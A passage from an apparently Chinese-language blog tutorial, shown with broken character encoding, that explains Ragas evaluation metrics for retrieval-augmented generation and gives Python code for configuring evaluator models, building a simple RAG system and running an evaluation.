â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-5">äºŒã€æ ¸å¿ƒè¯„ä¼°æŒ‡æ ‡</h3>
<h4 data-id="heading-6">2.1 æŒ‡æ ‡ä½“ç³»æ¦‚è§ˆ</h4>
<pre><code class="hljs language-scss" lang="scss">                    Ragas è¯„ä¼°æŒ‡æ ‡ä½“ç³»
                           â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                                      â”‚
    æ£€ç´¢è´¨é‡æŒ‡æ ‡                           ç”Ÿæˆè´¨é‡æŒ‡æ ‡
        â”‚                                      â”‚
        â”œâ”€ Context Precision                  â”œâ”€ Faithfulness
        â”‚  (ä¸Šä¸‹æ–‡ç²¾ç¡®åº¦)                      â”‚  (å¿ å®åº¦)
        â”‚                                      â”‚
        â”œâ”€ Context Recall                     â”œâ”€ Answer Relevancy
        â”‚  (ä¸Šä¸‹æ–‡å¬å›ç‡)                      â”‚  (ç­”æ¡ˆç›¸å…³æ€§)
        â”‚                                      â”‚
        â””â”€ Context Entity Recall              â””â”€ Factual Correctness
           (ä¸Šä¸‹æ–‡å®ä½“å¬å›)                      (äº‹å®æ­£ç¡®æ€§)
</code></pre>
<h4 data-id="heading-7">2.2 æ£€ç´¢è´¨é‡æŒ‡æ ‡</h4>
<h5 data-id="heading-8">Context Precisionï¼ˆä¸Šä¸‹æ–‡ç²¾ç¡®åº¦ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ä¸é—®é¢˜çš„ç›¸å…³æ€§</p>
<pre><code class="hljs language-diff" lang="diff">è¯„åˆ†æ ‡å‡†ï¼š
<span class="hljs-deletion">- é«˜åˆ†ï¼šæ£€ç´¢åˆ°çš„æ–‡æ¡£éƒ½é«˜åº¦ç›¸å…³ï¼Œæ²¡æœ‰å™ªéŸ³</span>
<span class="hljs-deletion">- ä¸­åˆ†ï¼šéƒ¨åˆ†ç›¸å…³ï¼Œå­˜åœ¨ä¸€äº›ä¸ç›¸å…³å†…å®¹</span>
<span class="hljs-deletion">- ä½åˆ†ï¼šæ£€ç´¢ç»“æœåŒ…å«å¤§é‡ä¸ç›¸å…³å†…å®¹</span>
</code></pre>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>è¯„ä¼°å‘é‡æ•°æ®åº“æ£€ç´¢æ•ˆæœ</li>
<li>å¯¹æ¯”ä¸åŒ embedding æ¨¡å‹</li>
<li>ä¼˜åŒ– chunk size å’Œ overlap å‚æ•°</li>
</ul>
<h5 data-id="heading-9">Context Recallï¼ˆä¸Šä¸‹æ–‡å¬å›ç‡ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡æ£€ç´¢ä¿¡æ¯çš„å®Œæ•´æ€§ï¼Œæ˜¯å¦è¦†ç›–å›ç­”æ‰€éœ€çš„æ‰€æœ‰å…³é”®ä¿¡æ¯</p>
<pre><code class="hljs language-diff" lang="diff">è¯„åˆ†æ ‡å‡†ï¼š
<span class="hljs-deletion">- é«˜åˆ†ï¼šæ£€ç´¢åˆ°çš„ä¿¡æ¯è¶³å¤Ÿå›ç­”é—®é¢˜</span>
<span class="hljs-deletion">- ä¸­åˆ†ï¼šéƒ¨åˆ†ä¿¡æ¯ç¼ºå¤±ï¼Œä½†å¯å‹‰å¼ºå›ç­”</span>
<span class="hljs-deletion">- ä½åˆ†ï¼šå…³é”®ä¿¡æ¯ç¼ºå¤±ï¼Œæ— æ³•å‡†ç¡®å›ç­”</span>
</code></pre>
<h5 data-id="heading-10">Context Entity Recallï¼ˆä¸Šä¸‹æ–‡å®ä½“å¬å›ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šä¸“é—¨è¯„ä¼°å®ä½“ï¼ˆå¦‚äººåã€åœ°åã€æ—¶é—´ç­‰ï¼‰çš„å¬å›æƒ…å†µ</p>
<h4 data-id="heading-11">2.3 ç”Ÿæˆè´¨é‡æŒ‡æ ‡</h4>
<h5 data-id="heading-12">Faithfulnessï¼ˆå¿ å®åº¦ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡ç­”æ¡ˆæ˜¯å¦åŸºäºæ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ï¼Œæ£€æµ‹å¹»è§‰é—®é¢˜</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯„ä¼°é—®é¢˜ç¤ºä¾‹</span>
<span class="hljs-string">"ç­”æ¡ˆä¸­çš„æ‰€æœ‰å£°æ˜æ˜¯å¦éƒ½èƒ½åœ¨æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ä¸­æ‰¾åˆ°ä¾æ®ï¼Ÿ"</span>

è¯„åˆ†ç»´åº¦ï¼š
- äº‹å®ä¸€è‡´æ€§
- æ— é¢å¤–ç¼–é€ ä¿¡æ¯
- é€»è¾‘æ¨ç†æ­£ç¡®æ€§
</code></pre>
<h5 data-id="heading-13">Answer Relevancyï¼ˆç­”æ¡ˆç›¸å…³æ€§ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡ç­”æ¡ˆä¸é—®é¢˜çš„ç›¸å…³ç¨‹åº¦</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯„ä¼°æ–¹æ³•</span>
<span class="hljs-number">1.</span> å°†ç­”æ¡ˆè½¬æ¢ä¸ºåå‘é—®é¢˜
<span class="hljs-number">2.</span> è®¡ç®—åå‘é—®é¢˜ä¸åŸé—®é¢˜çš„ç›¸ä¼¼åº¦
<span class="hljs-number">3.</span> è¯„åˆ†èŒƒå›´ï¼š<span class="hljs-number">0</span>-<span class="hljs-number">1</span>ï¼Œè¶Šé«˜è¶Šå¥½
</code></pre>
<h5 data-id="heading-14">Factual Correctnessï¼ˆäº‹å®æ­£ç¡®æ€§ï¼‰</h5>
<p><strong>å®šä¹‰</strong>ï¼šè¡¡é‡ç­”æ¡ˆçš„äº‹å®å‡†ç¡®æ€§ï¼Œé€šå¸¸éœ€è¦å‚è€ƒæ ‡å‡†ç­”æ¡ˆ</p>
<h4 data-id="heading-15">2.4 æŒ‡æ ‡é€‰æ‹©å»ºè®®</h4>

























<table><thead><tr><th>è¯„ä¼°ç›®æ ‡</th><th>æ¨èæŒ‡æ ‡ç»„åˆ</th></tr></thead><tbody><tr><td>æ£€ç´¢ç³»ç»Ÿä¼˜åŒ–</td><td>Context Precision + Context Recall</td></tr><tr><td>å¹»è§‰æ£€æµ‹</td><td>Faithfulness</td></tr><tr><td>ç”¨æˆ·ä½“éªŒè¯„ä¼°</td><td>Answer Relevancy + Faithfulness</td></tr><tr><td>å®Œæ•´è¯„ä¼°</td><td>å…¨éƒ¨æŒ‡æ ‡</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-16">ä¸‰ã€å®‰è£…ä¸é…ç½®</h3>
<h4 data-id="heading-17">3.1 åŸºç¡€å®‰è£…</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ ‡å‡†å®‰è£…</span>
pip install ragas

<span class="hljs-comment"># å®Œæ•´å®‰è£…ï¼ˆåŒ…å«ç¤ºä¾‹å’Œé¢å¤–ä¾èµ–ï¼‰</span>
pip install ragas[examples]

<span class="hljs-comment"># ä»æºç å®‰è£…</span>
git <span class="hljs-built_in">clone</span> https://github.com/explodinggradients/ragas.git
<span class="hljs-built_in">cd</span> ragas
pip install -e .
</code></pre>
<h4 data-id="heading-18">3.2 ç‰ˆæœ¬è¦æ±‚</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">æ ¸å¿ƒä¾èµ–:</span>
  <span class="hljs-attr">Python:</span> <span class="hljs-string">"&gt;=3.8"</span>
  <span class="hljs-attr">langchain:</span> <span class="hljs-string">"&gt;=0.1.0"</span>
  <span class="hljs-attr">langchain-openai:</span> <span class="hljs-string">"&gt;=0.0.5"</span>

<span class="hljs-string">å¯é€‰ä¾èµ–:</span>
  <span class="hljs-attr">openai:</span> <span class="hljs-string">ç”¨äº</span> <span class="hljs-string">GPT</span> <span class="hljs-string">æ¨¡å‹</span>
  <span class="hljs-attr">anthropic:</span> <span class="hljs-string">ç”¨äº</span> <span class="hljs-string">Claude</span> <span class="hljs-string">æ¨¡å‹</span>
  <span class="hljs-attr">sentence-transformers:</span> <span class="hljs-string">ç”¨äºæœ¬åœ°</span> <span class="hljs-string">embedding</span>
</code></pre>
<h4 data-id="heading-19">3.3 é…ç½®è¯„ä¼°å™¨ LLM</h4>
<h5 data-id="heading-20">æ–¹å¼ä¸€ï¼šä½¿ç”¨ OpenAI</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> ragas.llms <span class="hljs-keyword">import</span> LangchainLLMWrapper

<span class="hljs-comment"># é…ç½®ç¯å¢ƒå˜é‡</span>
os.environ[<span class="hljs-string">"OPENAI_API_KEY"</span>] = <span class="hljs-string">"your-api-key"</span>

<span class="hljs-comment"># åˆå§‹åŒ– LLM</span>
llm = ChatOpenAI(
    model=<span class="hljs-string">"gpt-4o"</span>,
    temperature=<span class="hljs-number">0</span>,
    max_tokens=<span class="hljs-number">1024</span>
)

<span class="hljs-comment"># åŒ…è£…ä¸º Ragas è¯„ä¼°å™¨</span>
evaluator_llm = LangchainLLMWrapper(llm)
</code></pre>
<h5 data-id="heading-21">æ–¹å¼äºŒï¼šä½¿ç”¨æœ¬åœ°æ¨¡å‹ï¼ˆOllamaï¼‰</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_community.llms <span class="hljs-keyword">import</span> Ollama
<span class="hljs-keyword">from</span> ragas.llms <span class="hljs-keyword">import</span> LangchainLLMWrapper

<span class="hljs-comment"># ä½¿ç”¨æœ¬åœ° Ollama æ¨¡å‹</span>
llm = Ollama(
    model=<span class="hljs-string">"llama3.2"</span>,
    temperature=<span class="hljs-number">0</span>
)

evaluator_llm = LangchainLLMWrapper(llm)
</code></pre>
<h5 data-id="heading-22">æ–¹å¼ä¸‰ï¼šä½¿ç”¨ Azure OpenAI</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> AzureChatOpenAI
<span class="hljs-keyword">from</span> ragas.llms <span class="hljs-keyword">import</span> LangchainLLMWrapper

llm = AzureChatOpenAI(
    azure_endpoint=<span class="hljs-string">"your-endpoint"</span>,
    api_key=<span class="hljs-string">"your-api-key"</span>,
    api_version=<span class="hljs-string">"2024-02-15-preview"</span>,
    deployment_name=<span class="hljs-string">"your-deployment"</span>
)

evaluator_llm = LangchainLLMWrapper(llm)
</code></pre>
<h4 data-id="heading-23">3.4 é…ç½® Embedding æ¨¡å‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> openai
<span class="hljs-keyword">from</span> ragas.embeddings <span class="hljs-keyword">import</span> OpenAIEmbeddings

<span class="hljs-comment"># OpenAI Embeddings</span>
openai_client = openai.OpenAI(api_key=<span class="hljs-string">"your-api-key"</span>)
embeddings = OpenAIEmbeddings(client=openai_client)

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨ HuggingFace</span>
<span class="hljs-keyword">from</span> ragas.embeddings <span class="hljs-keyword">import</span> HuggingfaceEmbeddings

embeddings = HuggingfaceEmbeddings(
    model_name=<span class="hljs-string">"BAAI/bge-large-zh-v1.5"</span>
)
</code></pre>
<hr/>
<h3 data-id="heading-24">å››ã€å®Œæ•´ä½¿ç”¨æµç¨‹</h3>
<h4 data-id="heading-25">4.1 æ„å»ºç®€å• RAG ç³»ç»Ÿ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> ragas.embeddings <span class="hljs-keyword">import</span> OpenAIEmbeddings
<span class="hljs-keyword">import</span> openai

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRAG</span>:
    <span class="hljs-string">"""
    ç®€å•çš„ RAG ç³»ç»Ÿå®ç°
    éµå¾ªå•ä¸€èŒè´£åŸåˆ™ï¼Œæ¯ä¸ªæ–¹æ³•åªåšä¸€ä»¶äº‹
    """</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, model: <span class="hljs-built_in">str</span> = <span class="hljs-string">"gpt-4o"</span></span>):
        <span class="hljs-string">"""
        åˆå§‹åŒ– RAG ç³»ç»Ÿ

        Args:
            model: ä½¿ç”¨çš„ LLM æ¨¡å‹åç§°
        """</span>
        self.llm = ChatOpenAI(model=model)
        openai_client = openai.OpenAI()
        self.embeddings = OpenAIEmbeddings(client=openai_client)
        self.doc_embeddings = <span class="hljs-literal">None</span>
        self.docs = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_documents</span>(<span class="hljs-params">self, documents: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""
        åŠ è½½æ–‡æ¡£å¹¶è®¡ç®—å‘é‡

        Args:
            documents: æ–‡æ¡£åˆ—è¡¨
        """</span>
        self.docs = documents
        self.doc_embeddings = self.embeddings.embed_texts(documents)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_compute_similarity</span>(<span class="hljs-params">self, query_embedding: np.ndarray,
                          doc_embedding: np.ndarray</span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-string">"""
        è®¡ç®—æŸ¥è¯¢å’Œæ–‡æ¡£çš„ä½™å¼¦ç›¸ä¼¼åº¦

        Args:
            query_embedding: æŸ¥è¯¢å‘é‡
            doc_embedding: æ–‡æ¡£å‘é‡

        Returns:
            ç›¸ä¼¼åº¦åˆ†æ•°
        """</span>
        <span class="hljs-keyword">return</span> np.dot(query_embedding, doc_embedding) / (
            np.linalg.norm(query_embedding) * np.linalg.norm(doc_embedding)
        )

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_most_relevant_docs</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, top_k: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]:
        <span class="hljs-string">"""
        æ£€ç´¢æœ€ç›¸å…³æ–‡æ¡£

        Args:
            query: ç”¨æˆ·æŸ¥è¯¢
            top_k: è¿”å›æ–‡æ¡£æ•°é‡

        Returns:
            æœ€ç›¸å…³çš„æ–‡æ¡£åˆ—è¡¨
        """</span>
        <span class="hljs-keyword">if</span> self.docs <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> self.doc_embeddings <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è¯·å…ˆè°ƒç”¨ load_documents åŠ è½½æ–‡æ¡£"</span>)

        query_embedding = self.embeddings.embed_text(query)
        similarities = [
            self._compute_similarity(query_embedding, doc_emb)
            <span class="hljs-keyword">for</span> doc_emb <span class="hljs-keyword">in</span> self.doc_embeddings
        ]

        <span class="hljs-comment"># è·å– top_k ä¸ªæœ€ç›¸å…³æ–‡æ¡£çš„ç´¢å¼•</span>
        top_indices = np.argsort(similarities)[-top_k:][::-<span class="hljs-number">1</span>]
        <span class="hljs-keyword">return</span> [self.docs[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> top_indices]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_answer</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, relevant_docs: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-built_in">str</span>:
        <span class="hljs-string">"""
        åŸºäºæ£€ç´¢åˆ°çš„æ–‡æ¡£ç”Ÿæˆç­”æ¡ˆ

        Args:
            query: ç”¨æˆ·æŸ¥è¯¢
            relevant_docs: ç›¸å…³æ–‡æ¡£åˆ—è¡¨

        Returns:
            ç”Ÿæˆçš„ç­”æ¡ˆ
        """</span>
        context = <span class="hljs-string">"\n\n"</span>.join(relevant_docs)
        prompt = <span class="hljs-string">f"é—®é¢˜: <span class="hljs-subst">{query}</span>\n\nå‚è€ƒæ–‡æ¡£:\n<span class="hljs-subst">{context}</span>\n\nè¯·æ ¹æ®å‚è€ƒæ–‡æ¡£å›ç­”é—®é¢˜ã€‚"</span>

        messages = [
            (<span class="hljs-string">"system"</span>, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæœ‰å¸®åŠ©çš„åŠ©æ‰‹ï¼Œä»…åŸºäºæä¾›çš„æ–‡æ¡£å›ç­”é—®é¢˜ã€‚"</span>),
            (<span class="hljs-string">"human"</span>, prompt),
        ]

        ai_msg = self.llm.invoke(messages)
        <span class="hljs-keyword">return</span> ai_msg.content

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">query</span>(<span class="hljs-params">self, query: <span class="hljs-built_in">str</span>, top_k: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
        <span class="hljs-string">"""
        å®Œæ•´çš„æŸ¥è¯¢æµç¨‹

        Args:
            query: ç”¨æˆ·æŸ¥è¯¢
            top_k: æ£€ç´¢æ–‡æ¡£æ•°é‡

        Returns:
            åŒ…å«ç­”æ¡ˆå’Œæ£€ç´¢æ–‡æ¡£çš„å­—å…¸
        """</span>
        relevant_docs = self.get_most_relevant_docs(query, top_k)
        answer = self.generate_answer(query, relevant_docs)

        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"query"</span>: query,
            <span class="hljs-string">"answer"</span>: answer,
            <span class="hljs-string">"retrieved_docs"</span>: relevant_docs
        }
</code></pre>
<h4 data-id="heading-26">4.2 å‡†å¤‡æµ‹è¯•æ•°æ®</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> EvaluationDataset
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd

<span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_test_dataset</span>(<span class="hljs-params">rag: SimpleRAG,
                        queries: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
                        references: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; EvaluationDataset:
    <span class="hljs-string">"""
    å‡†å¤‡è¯„ä¼°æ•°æ®é›†

    Args:
        rag: RAG ç³»ç»Ÿå®ä¾‹
        queries: æµ‹è¯•æŸ¥è¯¢åˆ—è¡¨
        references: å‚è€ƒç­”æ¡ˆåˆ—è¡¨ï¼ˆå¯é€‰ï¼‰

    Returns:
        EvaluationDataset å¯¹è±¡
    """</span>
    dataset = []

    <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(queries):
        <span class="hljs-comment"># æ‰§è¡ŒæŸ¥è¯¢</span>
        result = rag.query(query, top_k=<span class="hljs-number">3</span>)

        <span class="hljs-comment"># æ„å»ºæ•°æ®æ ·æœ¬</span>
        sample = {
            <span class="hljs-string">"user_input"</span>: query,
            <span class="hljs-string">"retrieved_contexts"</span>: result[<span class="hljs-string">"retrieved_docs"</span>],
            <span class="hljs-string">"response"</span>: result[<span class="hljs-string">"answer"</span>]
        }

        <span class="hljs-comment"># å¦‚æœæœ‰å‚è€ƒç­”æ¡ˆï¼Œæ·»åŠ åˆ°æ ·æœ¬ä¸­</span>
        <span class="hljs-keyword">if</span> references <span class="hljs-keyword">and</span> i &lt; <span class="hljs-built_in">len</span>(references):
            sample[<span class="hljs-string">"reference"</span>] = references[i]

        dataset.append(sample)

    <span class="hljs-keyword">return</span> EvaluationDataset.from_list(dataset)


<span class="hljs-comment"># ç¤ºä¾‹ä½¿ç”¨</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># ç¤ºä¾‹æ–‡æ¡£</span>
    sample_docs = [
        <span class="hljs-string">"é˜¿å°”ä¼¯ç‰¹Â·çˆ±å› æ–¯å¦æå‡ºäº†ç›¸å¯¹è®ºï¼Œè¿™æ”¹å˜äº†æˆ‘ä»¬å¯¹æ—¶é—´ã€ç©ºé—´å’Œå¼•åŠ›çš„ç†è§£ã€‚"</span>,
        <span class="hljs-string">"ç›ä¸½Â·å±…é‡Œæ˜¯ä¸€ä½ç‰©ç†å­¦å®¶å’ŒåŒ–å­¦å®¶ï¼Œå¥¹åœ¨æ”¾å°„æ€§ç ”ç©¶æ–¹é¢åšå‡ºäº†å¼€åˆ›æ€§å·¥ä½œï¼Œå¹¶è·å¾—äº†ä¸¤æ¬¡è¯ºè´å°”å¥–ã€‚"</span>,
        <span class="hljs-string">"è‰¾è¨å…‹Â·ç‰›é¡¿åˆ¶å®šäº†è¿åŠ¨å®šå¾‹å’Œä¸‡æœ‰å¼•åŠ›å®šå¾‹ï¼Œå¥ å®šäº†ç»å…¸åŠ›å­¦çš„åŸºç¡€ã€‚"</span>,
        <span class="hljs-string">"æŸ¥å°”æ–¯Â·è¾¾å°”æ–‡åœ¨ã€Šç‰©ç§èµ·æºã€‹ä¸€ä¹¦ä¸­æå‡ºäº†è‡ªç„¶é€‰æ‹©è¿›åŒ–è®ºã€‚"</span>,
        <span class="hljs-string">"é˜¿è¾¾Â·æ´›èŠ™è±æ–¯å› å…¶åœ¨æŸ¥å°”æ–¯Â·å·´è´å¥‡æ—©æœŸæœºæ¢°è®¡ç®—æœºåˆ†ææœºä¸Šçš„å·¥ä½œï¼Œè¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä½è®¡ç®—æœºç¨‹åºå‘˜ã€‚"</span>
    ]

    <span class="hljs-comment"># æµ‹è¯•æŸ¥è¯¢</span>
    sample_queries = [
        <span class="hljs-string">"è°æå‡ºäº†ç›¸å¯¹è®ºï¼Ÿ"</span>,
        <span class="hljs-string">"è°æ˜¯ç¬¬ä¸€ä½è®¡ç®—æœºç¨‹åºå‘˜ï¼Ÿ"</span>,
        <span class="hljs-string">"è‰¾è¨å…‹Â·ç‰›é¡¿å¯¹ç§‘å­¦æœ‰ä»€ä¹ˆè´¡çŒ®ï¼Ÿ"</span>,
        <span class="hljs-string">"è°å› æ”¾å°„æ€§ç ”ç©¶è·å¾—äº†ä¸¤æ¬¡è¯ºè´å°”å¥–ï¼Ÿ"</span>
    ]

    <span class="hljs-comment"># å‚è€ƒç­”æ¡ˆï¼ˆå¯é€‰ï¼‰</span>
    expected_responses = [
        <span class="hljs-string">"é˜¿å°”ä¼¯ç‰¹Â·çˆ±å› æ–¯å¦æå‡ºäº†ç›¸å¯¹è®º"</span>,
        <span class="hljs-string">"é˜¿è¾¾Â·æ´›èŠ™è±æ–¯è¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä½è®¡ç®—æœºç¨‹åºå‘˜"</span>,
        <span class="hljs-string">"è‰¾è¨å…‹Â·ç‰›é¡¿åˆ¶å®šäº†è¿åŠ¨å®šå¾‹å’Œä¸‡æœ‰å¼•åŠ›å®šå¾‹"</span>,
        <span class="hljs-string">"ç›ä¸½Â·å±…é‡Œå› æ”¾å°„æ€§ç ”ç©¶è·å¾—äº†ä¸¤æ¬¡è¯ºè´å°”å¥–"</span>
    ]

    <span class="hljs-comment"># åˆå§‹åŒ– RAG ç³»ç»Ÿ</span>
    rag = SimpleRAG()
    rag.load_documents(sample_docs)

    <span class="hljs-comment"># å‡†å¤‡è¯„ä¼°æ•°æ®é›†</span>
    evaluation_dataset = prepare_test_dataset(
        rag=rag,
        queries=sample_queries,
        references=expected_responses
    )

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•°æ®é›†å‡†å¤‡å®Œæˆï¼Œå…± <span class="hljs-subst">{<span class="hljs-built_in">len</span>(evaluation_dataset)}</span> ä¸ªæ ·æœ¬"</span>)
</code></pre>
<h4 data-id="heading-27">4.3 æ‰§è¡Œè¯„ä¼°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> evaluate
<span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> (
    LLMContextRecall,
    Faithfulness,
    FactualCorrectness,
    AnswerRelevancy,
    ContextPrecision
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">run_evaluation</span>(<span class="hljs-params">dataset: EvaluationDataset,
                  evaluator_llm,
                  metrics: <span class="hljs-built_in">list</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""
    è¿è¡Œ Ragas è¯„ä¼°

    Args:
        dataset: è¯„ä¼°æ•°æ®é›†
        evaluator_llm: è¯„ä¼°å™¨ LLM
        metrics: è¯„ä¼°æŒ‡æ ‡åˆ—è¡¨

    Returns:
        è¯„ä¼°ç»“æœå­—å…¸
    """</span>
    <span class="hljs-keyword">if</span> metrics <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-comment"># é»˜è®¤ä½¿ç”¨æ ¸å¿ƒæŒ‡æ ‡</span>
        metrics = [
            LLMContextRecall(),
            Faithfulness(),
            FactualCorrectness()
        ]

    results = evaluate(
        dataset=dataset,
        metrics=metrics,
        llm=evaluator_llm
    )

    <span class="hljs-keyword">return</span> results


<span class="hljs-comment"># ç¤ºä¾‹ä½¿ç”¨</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># é…ç½®è¯„ä¼°å™¨</span>
    evaluator_llm = LangchainLLMWrapper(
        ChatOpenAI(model=<span class="hljs-string">"gpt-4o"</span>, temperature=<span class="hljs-number">0</span>)
    )

    <span class="hljs-comment"># å®šä¹‰è¯„ä¼°æŒ‡æ ‡</span>
    metrics = [
        ContextPrecision(),
        LLMContextRecall(),
        Faithfulness(),
        AnswerRelevancy(),
    ]

    <span class="hljs-comment"># è¿è¡Œè¯„ä¼°</span>
    results = run_evaluation(
        dataset=evaluation_dataset,
        evaluator_llm=evaluator_llm,
        metrics=metrics
    )

    <span class="hljs-comment"># è¾“å‡ºç»“æœ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">50</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Ragas è¯„ä¼°ç»“æœ"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">50</span>)
    <span class="hljs-keyword">for</span> metric, score <span class="hljs-keyword">in</span> results.items():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{metric}</span>: <span class="hljs-subst">{score:<span class="hljs-number">.4</span>f}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">50</span>)

    <span class="hljs-comment"># ä¿å­˜ç»“æœ</span>
    results_df = results.to_pandas()
    results_df.to_csv(<span class="hljs-string">"rag_evaluation_results.csv"</span>, index=<span class="hljs-literal">False</span>)
</code></pre>
<h4 data-id="heading-28">4.4 å®Œæ•´ç¤ºä¾‹è„šæœ¬</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
å®Œæ•´çš„ Ragas è¯„ä¼°ç¤ºä¾‹è„šæœ¬
æ¼”ç¤ºä»æ„å»º RAG åˆ°è¯„ä¼°çš„å®Œæ•´æµç¨‹
"""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> ragas.embeddings <span class="hljs-keyword">import</span> OpenAIEmbeddings
<span class="hljs-keyword">from</span> ragas <span class="hljs-keyword">import</span> EvaluationDataset, evaluate
<span class="hljs-keyword">from</span> ragas.llms <span class="hljs-keyword">import</span> LangchainLLMWrapper
<span class="hljs-keyword">from</span> ragas.metrics <span class="hljs-keyword">import</span> (
    ContextPrecision,
    LLMContextRecall,
    Faithfulness,
    AnswerRelevancy
)
<span class="hljs-keyword">import</span> openai


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RAGEvaluator</span>:
    <span class="hljs-string">"""
    RAG ç³»ç»Ÿè¯„ä¼°å™¨
    å°è£…å®Œæ•´çš„è¯„ä¼°æµç¨‹
    """</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,
                 llm_model: <span class="hljs-built_in">str</span> = <span class="hljs-string">"gpt-4o"</span>,
                 evaluator_model: <span class="hljs-built_in">str</span> = <span class="hljs-string">"gpt-4o"</span></span>):
